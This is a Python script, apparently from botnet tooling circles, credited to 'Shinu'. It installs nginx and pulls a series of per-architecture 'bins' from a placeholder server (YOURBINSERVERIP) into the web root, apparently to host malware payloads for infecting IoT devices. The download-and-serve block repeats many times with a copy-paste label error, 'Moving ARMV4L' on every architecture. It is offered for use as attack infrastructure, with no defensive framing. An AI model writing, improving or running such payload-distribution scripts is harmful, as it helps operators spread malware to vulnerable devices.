# EasyBuild Made By Shinu.
# @FortuneC3 On Telegram
# shinunetworks On Discord
# Date Built 1/29/2025

#  ___                            _        
# |_ _|_ __ ___  _ __   ___  _ __| |_ ___  
#  | || '_ ` _ \| '_ \ / _ \| '__| __/ __| 
#  | || | | | | | |_) | (_) | |  | |_\__ \ 
# |___|_| |_| |_| .__/ \___/|_|   \__|___/ 
#               |_|                        
import time
import sys
import subprocess


#  ____        __ _            
# |  _ \  ___ / _(_)_ __   ___ 
# | | | |/ _ \ |_| | '_ \ / _ \
# | |_| |  __/  _| | | | |  __/
# |____/ \___|_| |_|_| |_|\___|

def run(command):
    subprocess.run(command, shell=True, check=True)

#   ____                                          _     
#  / ___|___  _ __ ___  _ __ ___   __ _ _ __   __| |___ 
# | |   / _ \| '_ ` _ \| '_ ` _ \ / _` | '_ \ / _` / __|
# | |__| (_) | | | | | | | | | | | (_| | | | | (_| \__ \
#  \____\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|\__,_|___/

print("...........................")
print("....... Bin Builder .......")
print("....... Made By Shinu .....")
print("...........................")
print("....... Shinu Networks ....")
print("...........................")
time.sleep(15)

print("[38;5;196mInstalling Nginx....[38;5;7m")

run("apt install nginx -y")
time.sleep(10)

print("[38;5;196mEnabling Nginx....[38;5;7m")

run("systemctl enable nginx")
time.sleep(10)

print("[38;5;196mStarting Nginx....[38;5;7m")

run("systemctl start nginx")
time.sleep(10)

print("[38;5;196mGetting Bins....[38;5;7m")
# Obvisouly chaneg bins to your bins.
# Change all the YOURBINSERVERIP and ARCHNAMES to what yours bins are
# Make Sure To wget your bin.sh as well
run("wget http://YOURBINSERVERIP/ARCHNAME")
print("[38;5;196mMoving ARMV4L To /var/www/html[38;5;7m")
run("sudo mv ARCHNAME /var/www/html")
time.sleep(10)
run("wget http://YOURBINSERVERIP/ARCHNAME")
print("[38;5;196mMoving ARMV4L To /var/www/html[38;5;7m")
run("sudo mv ARCHNAME /var/www/html")
time.sleep(10)
run("wget http://YOURBINSERVERIP/ARCHNAME")
print("[38;5;196mMoving ARMV4L To /var/www/html[38;5;7m")
run("sudo mv ARCHNAME /var/www/html")
time.sleep(10)
run("wget http://YOURBINSERVERIP/ARCHNAME")
print("[38;5;196mMoving ARMV4L To /var/www/html[38;5;7m")
run("sudo mv ARCHNAME /var/www/html")
time.sleep(10)
run("wget http://YOURBINSERVERIP/ARCHNAME")
print("[38;5;196mMoving ARMV4L To /var/www/html[38;5;7m")
run("sudo mv ARCHNAME /var/www/html")
time.sleep(10)
run("wget http://YOURBINSERVERIP/ARCHNAME")
print("[38;5;196mMoving ARMV4L To /var/www/html[38;5;7m")
run("sudo mv ARCHNAME /var/www/html")
time.sleep(10)
run("wget http://YOURBINSERVERIP/ARCHNAME")
print("[38;5;196mMoving ARMV4L To /var/www/html[38;5;7m")
run("sudo mv ARCHNAME /var/www/html")
time.sleep(10)
run("wget http://YOURBINSERVERIP/ARCHNAME")
print("[38;5;196mMoving ARMV4L To /var/www/html[38;5;7m")
run("sudo mv ARCHNAME /var/www/html")
time.sleep(10)
run("wget http://YOURBINSERVERIP/ARCHNAME")
print("[38;5;196mMoving ARMV4L To /var/www/html[38;5;7m")
run("sudo mv ARCHNAME /var/www/html")
time.sleep(10)
run("wget http://YOURBINSERVERIP/ARCHNAME")
print("[38;5;196mMoving ARMV4L To /var/www/html[38;5;7m")
run("sudo mv ARCHNAME /var/www/html")
time.sleep(10)
run("wget http://YOURBINSERVERIP/ARCHNAME")
print("[38;5;196mMoving ARMV4L To /var/www/html[38;5;7m")
run("sudo mv ARCHNAME /var/www/html")
time.sleep(10)
run("wget http://YOURBINSERVERIP/ARCHNAME")
print("[38;5;196mMoving ARMV4L To /var/www/html[38;5;7m")
run("sudo mv ARCHNAME /var/www/html")
time.sleep(10)
run("wget http://YOURBINSERVERIP/ARCHNAME")
print("[38;5;196mMoving ARMV4L To /var/www/html[38;5;7m")
run("sudo mv ARCHNAME /var/www/html")
time.sleep(10)
run("wget http://YOURBINSERVERIP/ARCHNAME")
print("[38;5;196mMoving ARMV4L To /var/www/html[38;5;7m")
run("sudo mv ARCHNAME /var/www/html")
time.sleep(10)

print("[38;5;196mBins Have Been Retrieved And Moved To [38;5;57m/var/www/html[38;5;7m[38;5;196m. Enjoy.[38;5;7m")
print("[38;5;196mBins Have Been Built[38;5;7m")
input("[38;5;196mPress Enter To Finish[38;5;7m")
exit()